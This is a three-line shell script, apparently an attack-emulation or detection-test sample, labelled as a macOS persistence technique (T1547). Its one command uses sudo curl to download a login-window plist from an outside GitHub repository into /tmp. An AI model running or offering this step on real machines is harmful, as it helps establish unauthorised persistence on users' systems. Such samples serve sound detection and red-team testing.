#!/usr/bin/env sh
# ATTACK_PERSISTENCE_T1547_MACOS_CURL_PLIST
sudo curl https://github.com/Pratik-987/Macos/raw/main/com.apple.loginwindow.plist -o /tmp/com.apple.loginwindow.plist
